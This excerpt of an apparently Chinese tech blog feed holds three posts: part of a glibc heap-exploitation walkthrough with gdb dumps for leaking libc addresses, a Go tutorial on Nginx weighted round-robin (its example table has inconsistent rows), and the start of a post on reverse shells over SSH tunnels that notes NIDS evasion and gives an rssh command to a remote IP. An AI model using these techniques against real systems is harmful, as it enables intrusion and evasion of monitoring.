class="built_in">free</span> chunk @ <span class="number">0x602160</span> - size <span class="number">0xa0</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">free</span> chunk @ <span class="number">0x6020b0</span> - size <span class="number">0x90</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">free</span> chunk @ <span class="number">0x602000</span> - size <span class="number">0x90</span></span><br><span class="line"># 这个也就是返回的 fake chunk 的地址, 这地址其实就是 bin_at 的返回值</span><br><span class="line">(gdb) p *(mfastbinptr)<span class="number">0x7ffff7dd1B78</span></span><br><span class="line">$<span class="number">1</span> = &#123;prev_size = <span class="number">6300192</span>, size = <span class="number">0</span>, fd = <span class="number">0x602160</span>, bk = <span class="number">0x602000</span>, fd_nextsize = <span class="number">0x7ffff7dd1b88</span> &lt;main_arena+<span class="number">104</span>&gt;, bk_nextsize = <span class="number">0x7ffff7dd1b88</span> &lt;main_arena+<span class="number">104</span>&gt;&#125;         </span><br><span class="line">(gdb) n</span><br><span class="line"><span class="number">20</span>          <span class="built_in">printf</span>(<span class="string">&quot;m1: %p\n&quot;</span>, m1);</span><br><span class="line"># 这里需要理解 Bins 的 FD 和 BK.</span><br><span class="line">(gdb) heap -l</span><br><span class="line">===================================Heap Dump===================================</span><br><span class="line"></span><br><span class="line">          ADDR             SIZE         STATUS</span><br><span class="line">sbrk_base <span class="number">0x602000</span></span><br><span class="line">chunk     <span class="number">0x602000</span>         <span class="number">0x90</span>         (F) FD <span class="number">0x7ffff7dd1bf8</span> BK <span class="number">0x6020b0</span> </span><br><span class="line">chunk     <span class="number">0x602090</span>         <span class="number">0x20</span>         (inuse)</span><br><span class="line">chunk     <span class="number">0x6020b0</span>         <span class="number">0x90</span>         (F) FD <span class="number">0x602000</span> BK <span class="number">0x7ffff7dd1bf8</span> </span><br><span class="line">chunk     <span class="number">0x602140</span>         <span class="number">0x20</span>         (inuse)</span><br><span class="line">chunk     <span class="number">0x602160</span>         <span class="number">0xa0</span>         (F) FD <span class="number">0x7ffff7dd1c08</span> BK <span class="number">0x7ffff7dd1c08</span> (LC)</span><br><span class="line">chunk     <span class="number">0x602200</span>         <span class="number">0x20</span>         (inuse)</span><br><span class="line">chunk     <span class="number">0x602220</span>         <span class="number">0xb0</span>         (inuse)</span><br><span class="line">chunk     <span class="number">0x6022d0</span>         <span class="number">0x20d30</span>      (top)</span><br><span class="line">sbrk_end  <span class="number">0x602001</span></span><br><span class="line"># 这里需要理解 Unsorted bin 是如何变为 small bin</span><br><span class="line">(gdb) heap -b</span><br><span class="line">===================================Heap Dump===================================</span><br><span class="line"></span><br><span class="line">small bin <span class="number">9</span> @ <span class="number">0x7ffff7dd1c08</span></span><br><span class="line">        <span class="built_in">free</span> chunk @ <span class="number">0x6020b0</span> - size <span class="number">0x90</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">free</span> chunk @ <span class="number">0x602000</span> - size <span class="number">0x90</span></span><br><span class="line">small bin <span class="number">10</span> @ <span class="number">0x7ffff7dd1c18</span></span><br><span class="line">        <span class="built_in">free</span> chunk @ <span class="number">0x602160</span> - size <span class="number">0xa0</span></span><br><span class="line"># bin_at 的返回, 需要联合上面的两条命令返回的结果一起理解</span><br><span class="line">(gdb) p *(mfastbinptr)<span class="number">0x7ffff7dd1BF8</span> </span><br><span class="line">$<span class="number">3</span> = &#123;prev_size = <span class="number">140737351850984</span>, size = <span class="number">140737351850984</span>, fd = <span class="number">0x6020b0</span>, bk = <span class="number">0x602000</span>, fd_nextsize = <span class="number">0x602160</span>, bk_nextsize = <span class="number">0x602160</span>&#125;</span><br><span class="line"># bin_at 的返回, 需要联合上面的两条命令返回的结果一起理解</span><br><span class="line">(gdb) p *(mfastbinptr)<span class="number">0x7ffff7dd1C08</span></span><br><span class="line">$<span class="number">2</span> = &#123;prev_size = <span class="number">6299824</span>, size = <span class="number">6299648</span>, fd = <span class="number">0x602160</span>, bk = <span class="number">0x602160</span>, fd_nextsize = <span class="number">0x7ffff7dd1c18</span> &lt;main_arena+<span class="number">248</span>&gt;, bk_nextsize = <span class="number">0x7ffff7dd1c18</span> &lt;main_arena+<span class="number">248</span>&gt;&#125;</span><br></pre></td></tr></table></figure><p>上面提到如何使用 Bins 泄露 libc 和 heap 的地址, 这一部分其实在 Phrack 的<code>&lt;Advanced Doug Lea&#39;s malloc exploits&gt;</code> 的<code>4.5 Abusing the leaked information</code>一小部分有提到. 可以通过 “find a lonely chunk in the heap” 去泄露, 相当于上面例子中的 m3, 位于 small bin 10, 释放后会修改 FD, BK 为该 Bin 的地址, 进而泄露 libc 的地址. 还有一种方法就是 “find the first or last chunk of a bin”, 相当于上面例子中的 m1, m2, 释放后, 会造成 FD 和 BK 一个在 <code>ptr_2_libc&#39;s_memory</code>, 一个在 <code>ptr_2_process&#39;_heap</code>.</p><p>下面说明如何使用一个<code>lonely chunk</code>, 拿到关键函数的地址, 在 <code>&lt;Advanced Doug Lea&#39;s malloc exploits&gt;</code>中使用的是 <code>__morecore</code>这个函数指针, 它指向 <code>__default_morecore</code>, 也就是系统用于增加内存的函数, 默认为 <code>brk()</code>, 这里简单提一下.</p><p>这里直接使用上面的 m3 作为例子举例,<code>m3</code>在释放后变为 <code>lonely chunk</code>, 位于 <code>small bin 10</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">0.</span>这里已知该 chunk 所在 bin 的地址 (t0 = <span class="number">0x7ffff7dd1c08</span>+<span class="number">0x10</span>)(对于为什么需要加 <span class="number">0x10</span>, 是因为 fake chunk, 具体参考上面)</span><br><span class="line">#<span class="number">1.</span>根据 chunk 的 size, 取得对应 bin index, 这里其实也就是 <span class="number">10</span>, 可以查看 bin_index 宏, 查看对应具体实现</span><br><span class="line">#<span class="number">2.</span>根据 bin index, 获取到该 bin 与 main_arena 的地址差, 从而获得 main_arena 的地址.</span><br><span class="line">t0 = <span class="number">0x7ffff7dd1c08</span> + <span class="number">0x10</span></span><br><span class="line">t1 = (<span class="type">long</span>)&amp;main_arena.bins - (<span class="type">long</span>)&amp;main_arena</span><br><span class="line">t2 = (<span class="type">long</span>)&amp;__morecore - (<span class="type">long</span>)&amp;(main_arena)</span><br><span class="line">t3 = (<span class="number">10</span><span class="number">-1</span>)*<span class="number">2</span>*<span class="number">8</span> <span class="comment">//至于为什么这么算, 请参考源码 bin_at 宏</span></span><br><span class="line">&amp;main_arena = t0 - (t3+t1) = <span class="number">0x7ffff7dd1b20</span></span><br><span class="line">#<span class="number">3.</span>根据 _morecore 与 main_arena 的地址差, 得到 _morecore 的地址</span><br><span class="line">&amp;__morecore = &amp;main_arena + t2</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 数据结构 </category>
          
          <category> 底层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> 底层 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 加权轮询算法</title>
      <link href="/2022/07/24/Nginx-%E5%8A%A0%E6%9D%83%E8%BD%AE%E8%AF%A2%E7%AE%97%E6%B3%95/"/>
      <url>/2022/07/24/Nginx-%E5%8A%A0%E6%9D%83%E8%BD%AE%E8%AF%A2%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="轮询-（round-robin）"><a href="#轮询-（round-robin）" class="headerlink" title="轮询 （round-robin）"></a>轮询 （round-robin）</h1><blockquote><p>简单的说一下轮询</p><ol><li>nginx 中的配置<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">upstream</span> cluster &#123;</span><br><span class="line"></span><br><span class="line"><span class="attribute">server</span> <span class="number">192.168.0.14</span>;</span><br><span class="line"><span class="attribute">server</span> <span class="number">192.168.0.15</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line"></span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>; //返回真实<span class="attribute">IP</span></span><br><span class="line">proxy_pass http://cluster; //代理指向<span class="attribute">cluster</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>简单介绍<h4 id="轮询-作为负载均衡中较为基础的算法，他的实现不需要配置额外的参数。简单理解：配置文件中一共配置了-N-台服务器，轮询-算法会遍历服务的节点列表，并按照节点顺序每轮选择一台服务器处理请求，当所有节点遍历一遍后，重新开始"><a href="#轮询-作为负载均衡中较为基础的算法，他的实现不需要配置额外的参数。简单理解：配置文件中一共配置了-N-台服务器，轮询-算法会遍历服务的节点列表，并按照节点顺序每轮选择一台服务器处理请求，当所有节点遍历一遍后，重新开始" class="headerlink" title="轮询 作为负载均衡中较为基础的算法，他的实现不需要配置额外的参数。简单理解：配置文件中一共配置了 N 台服务器，轮询 算法会遍历服务的节点列表，并按照节点顺序每轮选择一台服务器处理请求，当所有节点遍历一遍后，重新开始."></a>轮询 作为负载均衡中较为基础的算法，他的实现不需要配置额外的参数。简单理解：配置文件中一共配置了 N 台服务器，轮询 算法会遍历服务的节点列表，并按照节点顺序每轮选择一台服务器处理请求，当所有节点遍历一遍后，重新开始.</h4></li></ol></blockquote><ol><li><p>算法中不难看出，每台服务器处理请求的数量基本持平，按照请求时间逐一分配，因此只能适用于集群服务器性能相近的情况，平均分配让每台服务器承载量基本持平。但是如果集群服务器性能参差不齐，这样的算法会导致资源分配不合理，造成部分请求阻塞，部分服务器资源浪费。为了解决上述问题，我们将 轮询 算法升级了，引入了 加权轮询 算法，让集群中性能差异较大的服务器也能合理分配资源。达到资源尽量最大化合理利用</p></li><li><p>实现 </p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> RoundRobinBalance <span class="keyword">struct</span> &#123;</span><br><span class="line"></span><br><span class="line">curIndex <span class="type">int</span></span><br><span class="line">rss []<span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/** * @Author: yang * @Description：添加服务 * @Date: 2022/7/25 8:36 */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *RoundRobinBalance)</span></span> Add (params ...<span class="type">string</span>) <span class="type">error</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(params) == <span class="number">0</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">&quot;params len 1 at least&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">addr := params[<span class="number">0</span>]</span><br><span class="line">r.rss = <span class="built_in">append</span>(r.rss, addr)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/** * @Author: yang * @Description：轮询获取服务 * @Date: 2022/7/25 8:36 */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *RoundRobinBalance)</span></span> Next () <span class="type">string</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(r.rss) == <span class="number">0</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">lens := <span class="built_in">len</span>(r.rss)</span><br><span class="line"><span class="keyword">if</span> r.curIndex &gt;= lens &#123;</span><br><span class="line"></span><br><span class="line">r.curIndex = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">curAdd := r.rss[r.curIndex ]</span><br><span class="line">r.curIndex = (r.curIndex + <span class="number">1</span>) % lens</span><br><span class="line"><span class="keyword">return</span> curAdd</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>测试</li></ol><p>简单调用下方法查看结果<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* @Author: yang</span></span><br><span class="line"><span class="comment">* @Description：测试</span></span><br><span class="line"><span class="comment">* @Date: 2022/7/25 8:36</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">rb := <span class="built_in">new</span>(RoundRobinBalance)</span><br><span class="line">rb.Add(<span class="string">&quot;127.0.0.1:80&quot;</span>)</span><br><span class="line">rb.Add(<span class="string">&quot;127.0.0.1:81&quot;</span>)</span><br><span class="line">rb.Add(<span class="string">&quot;127.0.0.1:82&quot;</span>)</span><br><span class="line">rb.Add(<span class="string">&quot;127.0.0.1:83&quot;</span>)</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">go run main.go</span><br><span class="line">127.0.0.1:80</span><br><span class="line">127.0.0.1:81</span><br><span class="line">127.0.0.1:82</span><br><span class="line">127.0.0.1:83</span><br><span class="line">127.0.0.1:80</span><br><span class="line">127.0.0.1:81</span><br></pre></td></tr></table></figure><h1 id="二，Nginx-负载均衡的加权轮询-（weighted-round-robin）"><a href="#二，Nginx-负载均衡的加权轮询-（weighted-round-robin）" class="headerlink" title="二，Nginx 负载均衡的加权轮询 （weighted-round-robin）"></a>二，Nginx 负载均衡的加权轮询 （weighted-round-robin）</h1><h3 id="nginx-配置"><a href="#nginx-配置" class="headerlink" title="nginx 配置"></a>nginx 配置</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="section">upstream</span> cluster &#123;</span><br><span class="line"></span><br><span class="line"><span class="attribute">server</span> <span class="number">192.168.1.2</span> weight=<span class="number">5</span>;</span><br><span class="line"><span class="attribute">server</span> <span class="number">192.168.1.3</span> weight=<span class="number">3</span>;</span><br><span class="line"><span class="attribute">server</span> <span class="number">192.168.1.4</span> weight=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line"></span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>; //返回真实<span class="attribute">IP</span></span><br><span class="line">proxy_pass http://cluster; //代理指向<span class="attribute">cluster</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="加权算法简介-特点"><a href="#加权算法简介-特点" class="headerlink" title="加权算法简介-特点"></a>加权算法简介-特点</h3><p>不同的服务器的配置，部署的应用数量，网络状况等都会导致服务器处理能力会不一样，所以简单的 轮询 算法将不再适用，而引入 了加权轮询 算法：根据服务器不同的处理能力，给每个服务器分配不同的权值，根据不同的权值将不同的服务器分配到对应的服务器上；</p><blockquote><p>请求数量较大时，每个服务处理请求的数量之比会趋向于权重之比。</p></blockquote><h3 id="算法说明"><a href="#算法说明" class="headerlink" title="算法说明"></a>算法说明</h3><p>在 Nginx加权轮询算法 中，每个节点都有3个权重的变量</p><ul><li><p><code>Weight</code> : 配置的权重，根据配置文件初始化每个服务器节点的权重</p></li><li><p><code>currentWeight</code> : 节点的当前权重，初始化时是配置的权重，随后会一直变更</p></li><li><p><code>effectiveWeight</code> : 有效的权重，初始值为 weight ，通讯过程中发现节点异常，则 -1 ，之后再次选择本节点，调用成功一次则 +1 ，直到恢复到 weight。这个参数可以用于做降权。或者说是你的设置的权限修正。。</p></li></ul><p>Nginx加权轮询算法 的逻辑实现</p><ol><li><p>轮询所有节点，计算当前状态下所有的节点的 effectiveWeight 之和 作为 totalWeight；</p></li><li><p>更新每个节点的 currentWeight ， currentWeight = currentWeight + effectiveWeight; 选出所有节点 currentWeight 中最大的一个节点作为选中节点；</p></li><li><p>选择中的节点再次更新 currentWeight, currentWeight = currentWeight - totalWeight；</p></li></ol><h3 id="简单举例"><a href="#简单举例" class="headerlink" title="简单举例"></a>简单举例</h3><blockquote><p>注意：实现中不考虑健康检查，即所有的节点都是100%可用的，所以 effectiveWeight 等于 weight</p></blockquote><p>假设：现在有3个节点 {A, B, C} 分别权重为：{4, 2, 1}；请求7次<br>| 第N次请求 | 请求前 currentWeight                    | 选中的节点   | 请求后 currentWeight                    |<br>|———-|———————————————————|————-|———————————————————|<br>| 1     | [serverA=4, serverB=2, serverC=1]  | serverA | [serverA=1, serverB=4, serverC=2]  |<br>| 2     | [serverA=1, serverB=4, serverC=2]  | serverB | [serverA=5, serverB=-1, serverC=3] |<br>| 3     | [serverA=5, serverB=-1, serverC=3] | serverA | [serverA=2, serverB=1, serverC=4]  |<br>| 4     | [serverA=2, serverB=1, serverC=4]  | serverA | [serverA=-1, serverB=3, serverC=5] |<br>| 5     | [serverA=-1, serverB=3, serverC=5] | serverA | [serverA=3, serverB=5, serverC=-1] |<br>| 6     | [serverA=-1, serverB=3, serverC=5] | serverA | [serverA=3, serverB=5, serverC=-1] |<br>| 7     | [serverA=0, serverB=7, serverC=0]  | serverB | [serverA=4, serverB=2, serverC=1]  |</p><blockquote><p>totaoWeight = 4 + 2 + 1 = 7<br>第一次请求：serverA = 4 + 4 = 8 ， serverB = 2 + 2 = 4， serverC = 1 + 1 = 2；最大的是 serverA ；所以选择 serverA ；然后serverA = 8 - 7 = 1；最后得出：serverA=1, serverB=4, serverC=2<br>第二次请求：serverA = 1 + 4 = 5；serverB = 4 + 2 = 6 ；serverC = 2 + 1 = 3；最大的是 serverB ；所以选择 serverB ；然后 serverB = 6 - 7 = -1 ；最后得出：serverA=5, serverB=-1, serverC=3<br>以此类推……</p></blockquote><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>以golang实现下上面的逻辑：<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> WeightRoundRobinBalance <span class="keyword">struct</span> &#123;</span><br><span class="line"></span><br><span class="line">curIndex <span class="type">int</span></span><br><span class="line">rss []*WeightNode</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> WeightNode <span class="keyword">struct</span> &#123;</span><br><span class="line"></span><br><span class="line">weight <span class="type">int</span> <span class="comment">// 配置的权重，即在配置文件或初始化时约定好的每个节点的权重 </span></span><br><span class="line">currentWeight <span class="type">int</span> <span class="comment">//节点当前权重，会一直变化 </span></span><br><span class="line">effectiveWeight <span class="type">int</span> <span class="comment">//有效权重，初始值为weight, 通讯过程中发现节点异常，则-1 ，之后再次选取本节点，调用成功一次则+1，直达恢复到weight 。 用于健康检查，处理异常节点，降低其权重。 </span></span><br><span class="line">addr <span class="type">string</span> <span class="comment">// 服务器addr </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/** * @Author: yang * @Description：添加服务 * @Date: 2022/7/25 8:36 */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *WeightRoundRobinBalance)</span></span> Add (params ...<span class="type">string</span>) <span class="type">error</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(params) != <span class="number">2</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">&quot;params len need 2&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// @Todo 获取值 </span></span><br><span class="line">addr := params[<span class="number">0</span>]</span><br><span class="line">parInt, err := strconv.ParseInt(params[<span class="number">1</span>], <span class="number">10</span>, <span class="number">64</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">node := &amp;WeightNode&#123;</span><br><span class="line"></span><br><span class="line">weight: <span class="type">int</span>(parInt),</span><br><span class="line">effectiveWeight: <span class="type">int</span>(parInt), <span class="comment">// 初始化時有效权重 = 配置权重值 </span></span><br><span class="line">currentWeight: <span class="type">int</span>(parInt), <span class="comment">// 初始化時当前权重 = 配置权重值 </span></span><br><span class="line">addr: addr,</span><br><span class="line">&#125;</span><br><span class="line">r.rss = <span class="built_in">append</span>(r.rss, node)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/** * @Author: yang * @Description：轮询获取服务 * @Date: 2022/7/25 8:36 */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *WeightRoundRobinBalance)</span></span> Next () <span class="type">string</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @Todo 没有服务 </span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(r.rss) == <span class="number">0</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">totalWeight := <span class="number">0</span></span><br><span class="line"><span class="keyword">var</span> maxWeightNode *WeightNode</span><br><span class="line"><span class="keyword">for</span> key , node := <span class="keyword">range</span> r.rss &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @Todo 计算当前状态下所有节点的effectiveWeight之和totalWeight </span></span><br><span class="line">totalWeight += node.effectiveWeight</span><br><span class="line"><span class="comment">// @Todo 计算currentWeight </span></span><br><span class="line">node.currentWeight += node.effectiveWeight</span><br><span class="line"><span class="comment">// @Todo 寻找权重最大的 </span></span><br><span class="line"><span class="keyword">if</span> maxWeightNode == <span class="literal">nil</span> || maxWeightNode.currentWeight &lt; node.currentWeight &#123;</span><br><span class="line"></span><br><span class="line">maxWeightNode = node</span><br><span class="line">r.curIndex = key</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// @Todo 更新选中节点的currentWeight </span></span><br><span class="line">maxWeightNode.currentWeight -= totalWeight</span><br><span class="line"><span class="comment">// @Todo 返回addr </span></span><br><span class="line"><span class="keyword">return</span> maxWeightNode.addr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="测试验证"><a href="#测试验证" class="headerlink" title="测试验证"></a>测试验证</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** * @Author: yang * @Description：测试 * @Date: 2022/7/25 8:36 */</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">rb := <span class="built_in">new</span>(WeightRoundRobinBalance)</span><br><span class="line">rb.Add(<span class="string">&quot;127.0.0.1:80&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">rb.Add(<span class="string">&quot;127.0.0.1:81&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">rb.Add(<span class="string">&quot;127.0.0.1:82&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">fmt.Println(rb.Next())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行看下结果：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">run main.go</span><br><span class="line">127.0.0.1:80</span><br><span class="line">127.0.0.1:81</span><br><span class="line">127.0.0.1:80</span><br><span class="line">127.0.0.1:80</span><br><span class="line">127.0.0.1:82</span><br><span class="line">127.0.0.1:80</span><br><span class="line">127.0.0.1:81</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 算法 </tag>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用ssh 隧道反弹shell</title>
      <link href="/2022/07/22/ssh-%E9%9A%A7%E9%81%93%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2022/07/22/ssh-%E9%9A%A7%E9%81%93%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><blockquote><p>利用ssh隧道来反弹shell.</p></blockquote><p>使用ssh进行隧道的好处：</p><ol><li>SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据，同时能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务，这样能够避免被NIDS检测到；</li><li>SSH基本上在每个机器上面存在，不需要额外的条件;</li></ol><h1 id="RSSH"><a href="#RSSH" class="headerlink" title="RSSH"></a>RSSH</h1><p>rssh的说明是:</p><blockquote><p>This program is a simple reverse shell over SSH. Essentially, it opens a connection to a remote computer over SSH, starts listening on a port on the remote computer, and when connections are made to that port, starts a command locally and copies data to and from it.</p><blockquote><p>rssh是一个利用SSH反弹shell的程序．原理就是通过SSH在远程服务器上监听一个端口，并执行远程服务器发送过来的数据.</p></blockquote></blockquote><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>在本地运行:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run main.go -a ‘127.0.0.1:2222’ -u user -i id_remote_rsa IP.OF.REMOTE.MACHINE</span><br></pre></td></tr></table></figure><br>正常运行就会如下的结果：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">main.go -a 